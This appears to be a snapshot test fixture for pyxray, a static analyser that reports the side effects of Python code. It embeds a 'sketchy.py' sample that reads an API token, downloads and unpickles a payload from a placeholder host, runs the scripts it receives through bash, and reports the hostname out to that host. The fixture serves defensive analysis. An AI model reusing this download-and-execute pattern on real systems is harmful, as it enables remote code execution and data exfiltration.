@@ -1,0 +1,909 @@
+---
+source: crates/pyxray-core/tests/snapshots.rs
+expression: report
+---
+{
+  "schema": 1,
+  "meta": {
+    "name": "sketchy.py",
+    "bytes": 671,
+    "parsed": true,
+    "synopsis": "reads the environment → makes 2 network calls → DELETES /tmp/stage → evaluates code at runtime (+2 more)",
+    "headline": [
+      "reads the environment",
+      "makes 2 network calls",
+      "DELETES /tmp/stage",
+      "evaluates code at runtime",
+      "runs 2 commands",
+      "writes 3 files"
+    ]
+  },
+  "spine": {
+    "id": 0,
+    "kind": "module",
+    "label": "sketchy.py",
+    "detail": null,
+    "line": 1,
+    "end_line": 21,
+    "depth": 0,
+    "own_effects": 0,
+    "effects": 254,
+    "severity": "caution",
+    "weight": 17,
+    "children": [
+      {
+        "id": 1,
+        "kind": "import",
+        "label": "import os, subprocess, shutil, pickle, base64",
+        "detail": null,
+        "line": 1,
+        "end_line": 1,
+        "depth": 0,
+        "own_effects": 0,
+        "effects": 0,
+        "severity": null,
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 2,
+        "kind": "import",
+        "label": "import requests",
+        "detail": null,
+        "line": 2,
+        "end_line": 2,
+        "depth": 0,
+        "own_effects": 0,
+        "effects": 0,
+        "severity": null,
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 3,
+        "kind": "assign",
+        "label": "TOKEN = os.environ[\"API_TOKEN\"]",
+        "detail": null,
+        "line": 4,
+        "end_line": 4,
+        "depth": 0,
+        "own_effects": 32,
+        "effects": 32,
+        "severity": "caution",
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 4,
+        "kind": "assign",
+        "label": "STAGING = \"/tmp/stage\"",
+        "detail": null,
+        "line": 5,
+        "end_line": 5,
+        "depth": 0,
+        "own_effects": 0,
+        "effects": 0,
+        "severity": null,
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 5,
+        "kind": "call",
+        "label": "shutil.rmtree(STAGING, ignore_errors=True)",
+        "detail": null,
+        "line": 7,
+        "end_line": 7,
+        "depth": 0,
+        "own_effects": 4,
+        "effects": 4,
+        "severity": "caution",
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 6,
+        "kind": "call",
+        "label": "os.makedirs(STAGING)",
+        "detail": null,
+        "line": 8,
+        "end_line": 8,
+        "depth": 0,
+        "own_effects": 2,
+        "effects": 2,
+        "severity": "info",
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 7,
+        "kind": "assign",
+        "label": "resp = requests.get(\"https://example.invalid/payload\", …2)",
+        "detail": null,
+        "line": 10,
+        "end_line": 10,
+        "depth": 0,
+        "own_effects": 8,
+        "effects": 8,
+        "severity": "caution",
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 8,
+        "kind": "assign",
+        "label": "blob = base64.b64decode(resp.content)",
+        "detail": null,
+        "line": 11,
+        "end_line": 11,
+        "depth": 0,
+        "own_effects": 0,
+        "effects": 0,
+        "severity": null,
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 9,
+        "kind": "assign",
+        "label": "config = pickle.loads(blob)",
+        "detail": null,
+        "line": 12,
+        "end_line": 12,
+        "depth": 0,
+        "own_effects": 64,
+        "effects": 64,
+        "severity": "caution",
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 10,
+        "kind": "loop",
+        "label": "for name, script in config[\"steps\"]",
+        "detail": null,
+        "line": 14,
+        "end_line": 17,
+        "depth": 0,
+        "own_effects": 0,
+        "effects": 18,
+        "severity": "caution",
+        "weight": 4,
+        "children": [
+          {
+            "id": 11,
+            "kind": "with",
+            "label": "with open(f\"{STAGING}/{name}.sh\", \"w\") as fh",
+            "detail": null,
+            "line": 15,
+            "end_line": 16,
+            "depth": 1,
+            "own_effects": 2,
+            "effects": 2,
+            "severity": "notable",
+            "weight": 2,
+            "children": [
+              {
+                "id": 12,
+                "kind": "call",
+                "label": "fh.write(script)",
+                "detail": null,
+                "line": 16,
+                "end_line": 16,
+                "depth": 2,
+                "own_effects": 2,
+                "effects": 2,
+                "severity": "notable",
+                "weight": 1,
+                "children": []
+              }
+            ]
+          },
+          {
+            "id": 13,
+            "kind": "call",
+            "label": "subprocess.run(f\"bash {STAGING}/{name}.sh\", …2)",
+            "detail": null,
+            "line": 17,
+            "end_line": 17,
+            "depth": 1,
+            "own_effects": 16,
+            "effects": 16,
+            "severity": "caution",
+            "weight": 1,
+            "children": []
+          }
+        ]
+      },
+      {
+        "id": 14,
+        "kind": "call",
+        "label": "requests.post(\"https://example.invalid/report\", …1)",
+        "detail": null,
+        "line": 19,
+        "end_line": 19,
+        "depth": 0,
+        "own_effects": 40,
+        "effects": 40,
+        "severity": "caution",
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 15,
+        "kind": "call",
+        "label": "subprocess.run([\"rm\", \"-rf\", STAGING])",
+        "detail": null,
+        "line": 20,
+        "end_line": 20,
+        "depth": 0,
+        "own_effects": 16,
+        "effects": 16,
+        "severity": "caution",
+        "weight": 1,
+        "children": []
+      },
+      {
+        "id": 16,
+        "kind": "call",
+        "label": "print(\"done\")",
+        "detail": null,
+        "line": 21,
+        "end_line": 21,
+        "depth": 0,
+        "own_effects": 128,
+        "effects": 128,
+        "severity": "info",
+        "weight": 1,
+        "children": []
+      }
+    ]
+  },
+  "imports": [
+    {
+      "module": "os",
+      "names": [],
+      "alias": null,
+      "line": 1,
+      "third_party": false,
+      "deferred": false
+    },
+    {
+      "module": "subprocess",
+      "names": [],
+      "alias": null,
+      "line": 1,
+      "third_party": false,
+      "deferred": false
+    },
+    {
+      "module": "shutil",
+      "names": [],
+      "alias": null,
+      "line": 1,
+      "third_party": false,
+      "deferred": false
+    },
+    {
+      "module": "pickle",
+      "names": [],
+      "alias": null,
+      "line": 1,
+      "third_party": false,
+      "deferred": false
+    },
+    {
+      "module": "base64",
+      "names": [],
+      "alias": null,
+      "line": 1,
+      "third_party": false,
+      "deferred": false
+    },
+    {
+      "module": "requests",
+      "names": [],
+      "alias": null,
+      "line": 2,
+      "third_party": true,
+      "deferred": false
+    }
+  ],
+  "effects": [
+    {
+      "effect": "env",
+      "severity": "caution",
+      "verb": "getenv",
+      "symbol": "os.environ",
+      "target": "API_TOKEN",
+      "line": 4,
+      "col": 9,
+      "snippet": "os.environ[\"API_TOKEN\"]",
+      "note": "reads a secret from the environment"
+    },
+    {
+      "effect": "fs_delete",
+      "severity": "caution",
+      "verb": "rmtree",
+      "symbol": "shutil.rmtree",
+      "target": "/tmp/stage",
+      "line": 7,
+      "col": 1,
+      "snippet": "shutil.rmtree(STAGING, ignore_errors=True)",
+      "note": "recursively deletes a directory; ignore_errors=True — failures pass silently"
+    },
+    {
+      "effect": "fs_write",
+      "severity": "info",
+      "verb": "mkdir",
+      "symbol": "os.makedirs",
+      "target": "/tmp/stage",
+      "line": 8,
+      "col": 1,
+      "snippet": "os.makedirs(STAGING)",
+      "note": null
+    },
+    {
+      "effect": "net",
+      "severity": "caution",
+      "verb": "GET",
+      "symbol": "requests.get",
+      "target": "https://example.invalid/payload",
+      "line": 10,
+      "col": 8,
+      "snippet": "requests.get(\"https://example.invalid/payload\", headers={\"X-Token\":…",
+      "note": "verify=False — TLS certificates are not checked"
+    },
+    {
+      "effect": "dynamic",
+      "severity": "caution",
+      "verb": "unpickle",
+      "symbol": "pickle.loads",
+      "target": null,
+      "line": 12,
+      "col": 10,
+      "snippet": "pickle.loads(blob)",
+      "note": "unpickling runs arbitrary code"
+    },
+    {
+      "effect": "fs_write",
+      "severity": "notable",
+      "verb": "truncate",
+      "symbol": "open",
+      "target": "f\"{STAGING}/{name}.sh\"",
+      "line": 15,
+      "col": 10,
+      "snippet": "open(f\"{STAGING}/{name}.sh\", \"w\")",
+      "note": null
+    },
+    {
+      "effect": "fs_write",
+      "severity": "notable",
+      "verb": "write",
+      "symbol": "<file>.write",
+      "target": "open(f\"{STAGING}/{name}.sh\", \"w\")",
+      "line": 16,
+      "col": 9,
+      "snippet": "fh.write(script)",
+      "note": null
+    },
+    {
+      "effect": "process",
+      "severity": "caution",
+      "verb": "run",
+      "symbol": "subprocess.run",
+      "target": "f\"bash {STAGING}/{name}.sh\"",
+      "line": 17,
+      "col": 5,
+      "snippet": "subprocess.run(f\"bash {STAGING}/{name}.sh\", shell=True, check=False)",
+      "note": "runs an external command; shell=True — the argument is interpreted by /bin/sh; check=False — a failing command is ignored"
+    },
+    {
+      "effect": "net",
+      "severity": "caution",
+      "verb": "POST",
+      "symbol": "requests.post",
+      "target": "https://example.invalid/report",
+      "line": 19,
+      "col": 1,
+      "snippet": "requests.post(\"https://example.invalid/report\", json={\"host\": os.uname…",
+      "note": "sends data to a remote host"
+    },
+    {
+      "effect": "env",
+      "severity": "info",
+      "verb": "probe",
+      "symbol": "os.uname",
+      "target": null,
+      "line": 19,
+      "col": 63,
+      "snippet": "os.uname()",
+      "note": null
+    },
+    {
+      "effect": "process",
+      "severity": "caution",
+      "verb": "run",
+      "symbol": "subprocess.run",
+      "target": "[\"rm\", \"-rf\", STAGING]",
+      "line": 20,
+      "col": 1,
+      "snippet": "subprocess.run([\"rm\", \"-rf\", STAGING])",
+      "note": "runs an external command; recursive delete"
+    },
+    {
+      "effect": "stdout",
+      "severity": "info",
+      "verb": "print",
+      "symbol": "print",
+      "target": "done",
+      "line": 21,
+      "col": 1,
+      "snippet": "print(\"done\")",
+      "note": null
+    }
+  ],
+  "symbols": [
+    {
+      "canonical": "subprocess.run",
+      "display": "subprocess.run",
+      "group": "subprocess",
+      "origin": "import",
+      "count": 2,
+      "lines": [
+        17,
+        20
+      ],
+      "effects": 16
+    },
+    {
+      "canonical": "open",
+      "display": "open",
+      "group": "<builtins>",
+      "origin": "builtin",
+      "count": 1,
+      "lines": [
+        15
+      ],
+      "effects": 2
+    },
+    {
+      "canonical": "print",
+      "display": "print",
+      "group": "<builtins>",
+      "origin": "builtin",
+      "count": 1,
+      "lines": [
+        21
+      ],
+      "effects": 128
+    },
+    {
+      "canonical": "base64.b64decode",
+      "display": "base64.b64decode",
+      "group": "base64",
+      "origin": "import",
+      "count": 1,
+      "lines": [
+        11
+      ],
+      "effects": 0
+    },
+    {
+      "canonical": "<file>.write",
+      "display": "fh.write",
+      "group": "file",
+      "origin": "method",
+      "count": 1,
+      "lines": [
+        16
+      ],
+      "effects": 2
+    },
+    {
+      "canonical": "os.makedirs",
+      "display": "os.makedirs",
+      "group": "os",
+      "origin": "import",
+      "count": 1,
+      "lines": [
+        8
+      ],
+      "effects": 2
+    },
+    {
+      "canonical": "os.uname",
+      "display": "os.uname",
+      "group": "os",
+      "origin": "import",
+      "count": 1,
+      "lines": [
+        19
+      ],
+      "effects": 32
+    },
+    {
+      "canonical": "pickle.loads",
+      "display": "pickle.loads",
+      "group": "pickle",
+      "origin": "import",
+      "count": 1,
+      "lines": [
+        12
+      ],
+      "effects": 64
+    },
+    {
+      "canonical": "requests.get",
+      "display": "requests.get",
+      "group": "requests",
+      "origin": "import",
+      "count": 1,
+      "lines": [
+        10
+      ],
+      "effects": 8
+    },
+    {
+      "canonical": "requests.post",
+      "display": "requests.post",
+      "group": "requests",
+      "origin": "import",
+      "count": 1,
+      "lines": [
+        19
+      ],
+      "effects": 8
+    },
+    {
+      "canonical": "shutil.rmtree",
+      "display": "shutil.rmtree",
+      "group": "shutil",
+      "origin": "import",
+      "count": 1,
+      "lines": [
+        7
+      ],
+      "effects": 4
+    }
+  ],
+  "bindings": [
+    {
+      "name": "TOKEN",
+      "kind": "assign",
+      "value": "unknown",
+      "origin": "os.environ[\"API_TOKEN\"]",
+      "scope": "<module>",
+      "line": 4,
+      "depth": 0,
+      "reads": 1,
+      "rebinds": 0,
+      "accumulates": false,
+      "dead": false
+    },
+    {
+      "name": "STAGING",
+      "kind": "assign",
+      "value": "text",
+      "origin": "\"/tmp/stage\"",
+      "scope": "<module>",
+      "line": 5,
+      "depth": 0,
+      "reads": 5,
+      "rebinds": 0,
+      "accumulates": false,
+      "dead": false
+    },
+    {
+      "name": "resp",
+      "kind": "assign",
+      "value": "response",
+      "origin": "requests.get(\"https://example.inv…\", …2)",
+      "scope": "<module>",
+      "line": 10,
+      "depth": 0,
+      "reads": 1,
+      "rebinds": 0,
+      "accumulates": false,
+      "dead": false
+    },
+    {
+      "name": "blob",
+      "kind": "assign",
+      "value": "unknown",
+      "origin": "base64.b64decode(resp.content)",
+      "scope": "<module>",
+      "line": 11,
+      "depth": 0,
+      "reads": 1,
+      "rebinds": 0,
+      "accumulates": false,
+      "dead": false
+    },
+    {
+      "name": "config",
+      "kind": "assign",
+      "value": "unknown",
+      "origin": "pickle.loads(blob)",
+      "scope": "<module>",
+      "line": 12,
+      "depth": 0,
+      "reads": 1,
+      "rebinds": 0,
+      "accumulates": false,
+      "dead": false
+    },
+    {
+      "name": "name",
+      "kind": "loop_var",
+      "value": "unknown",
+      "origin": "config[\"steps\"]",
+      "scope": "<module>",
+      "line": 14,
+      "depth": 0,
+      "reads": 2,
+      "rebinds": 0,
+      "accumulates": false,
+      "dead": false
+    },
+    {
+      "name": "script",
+      "kind": "loop_var",
+      "value": "unknown",
+      "origin": "config[\"steps\"]",
+      "scope": "<module>",
+      "line": 14,
+      "depth": 0,
+      "reads": 1,
+      "rebinds": 0,
+      "accumulates": false,
+      "dead": false
+    },
+    {
+      "name": "fh",
+      "kind": "with_var",
+      "value": "file",
+      "origin": "open(f\"{STAGING}/{name}.sh\", \"w\")",
+      "scope": "<module>",
+      "line": 15,
+      "depth": 0,
+      "reads": 1,
+      "rebinds": 0,
+      "accumulates": false,
+      "dead": false
+    }
+  ],
+  "metrics": {
+    "lines_total": 21,
+    "lines_code": 16,
+    "lines_comment": 0,
+    "lines_blank": 5,
+    "statements": 16,
+    "max_depth": 2,
+    "complexity": 2,
+    "functions": 0,
+    "classes": 0,
+    "async_defs": 0,
+    "calls": 12,
+    "imports": 6,
+    "loops": 1,
+    "branches": 0,
+    "handlers": 0,
+    "risk": 100
+  },
+  "texture": [
+    {
+      "indent": 0,
+      "width": 45,
+      "blank": false,
+      "comment": false,
+      "kind": "import",
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 15,
+      "blank": false,
+      "comment": false,
+      "kind": "import",
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 0,
+      "blank": true,
+      "comment": false,
+      "kind": null,
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 31,
+      "blank": false,
+      "comment": false,
+      "kind": "assign",
+      "effects": 32,
+      "severity": "caution"
+    },
+    {
+      "indent": 0,
+      "width": 22,
+      "blank": false,
+      "comment": false,
+      "kind": "assign",
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 0,
+      "blank": true,
+      "comment": false,
+      "kind": null,
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 42,
+      "blank": false,
+      "comment": false,
+      "kind": "call",
+      "effects": 4,
+      "severity": "caution"
+    },
+    {
+      "indent": 0,
+      "width": 20,
+      "blank": false,
+      "comment": false,
+      "kind": "call",
+      "effects": 2,
+      "severity": "info"
+    },
+    {
+      "indent": 0,
+      "width": 0,
+      "blank": true,
+      "comment": false,
+      "kind": null,
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 96,
+      "blank": false,
+      "comment": false,
+      "kind": "assign",
+      "effects": 8,
+      "severity": "caution"
+    },
+    {
+      "indent": 0,
+      "width": 37,
+      "blank": false,
+      "comment": false,
+      "kind": "assign",
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 27,
+      "blank": false,
+      "comment": false,
+      "kind": "assign",
+      "effects": 64,
+      "severity": "caution"
+    },
+    {
+      "indent": 0,
+      "width": 0,
+      "blank": true,
+      "comment": false,
+      "kind": null,
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 36,
+      "blank": false,
+      "comment": false,
+      "kind": "loop",
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 4,
+      "width": 45,
+      "blank": false,
+      "comment": false,
+      "kind": "with",
+      "effects": 2,
+      "severity": "notable"
+    },
+    {
+      "indent": 8,
+      "width": 16,
+      "blank": false,
+      "comment": false,
+      "kind": "call",
+      "effects": 2,
+      "severity": "notable"
+    },
+    {
+      "indent": 4,
+      "width": 68,
+      "blank": false,
+      "comment": false,
+      "kind": "call",
+      "effects": 16,
+      "severity": "caution"
+    },
+    {
+      "indent": 0,
+      "width": 0,
+      "blank": true,
+      "comment": false,
+      "kind": null,
+      "effects": 0,
+      "severity": null
+    },
+    {
+      "indent": 0,
+      "width": 83,
+      "blank": false,
+      "comment": false,
+      "kind": "call",
+      "effects": 40,
+      "severity": "caution"
+    },
+    {
+      "indent": 0,
+      "width": 38,
+      "blank": false,
+      "comment": false,
+      "kind": "call",
+      "effects": 16,
+      "severity": "caution"
+    },
+    {
+      "indent": 0,
+      "width": 13,
+      "blank": false,
+      "comment": false,
+      "kind": "call",
+      "effects": 128,
+      "severity": "info"
+    }
+  ],
+  "diagnostics": [],
+  "source": [
+    "import os, subprocess, shutil, pickle, base64",
+    "import requests",
+    "",
+    "TOKEN = os.environ[\"API_TOKEN\"]",
+    "STAGING = \"/tmp/stage\"",
+    "",
+    "shutil.rmtree(STAGING, ignore_errors=True)",
+    "os.makedirs(STAGING)",
+    "",
+    "resp = requests.get(\"https://example.invalid/payload\", headers={\"X-Token\": TOKEN}, verify=False)",
+    "blob = base64.b64decode(resp.content)",
+    "config = pickle.loads(blob)",
+    "",
+    "for name, script in config[\"steps\"]:",
+    "    with open(f\"{STAGING}/{name}.sh\", \"w\") as fh:",
+    "        fh.write(script)",
+    "    subprocess.run(f\"bash {STAGING}/{name}.sh\", shell=True, check=False)",
+    "",
+    "requests.post(\"https://example.invalid/report\", json={\"host\": os.uname().nodename})",
+    "subprocess.run([\"rm\", \"-rf\", STAGING])",
+    "print(\"done\")"
+  ]
+}
